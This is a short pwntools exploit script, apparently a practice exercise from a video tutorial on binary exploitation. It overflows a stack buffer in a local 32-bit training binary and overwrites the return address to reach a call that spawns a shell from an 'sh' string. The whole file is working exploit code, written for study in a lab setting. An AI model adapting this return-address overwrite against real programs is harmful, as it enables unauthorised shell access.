'''
Author: 白银
Date: 2022-08-29 17:01:10
LastEditTime: 2022-08-29 17:26:02
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=19&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=538.1
'''
from pwn import *

context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_4_3_x86'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x14

gdb.attach(io)
pause()

# return_addr = elf.symbols['func']
return_addr = 0x804919B  # func里面的call的地址

sh_addr = 0x804C03A

payload = flat(['a' * padding, return_addr, sh_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload)
io.interactive()
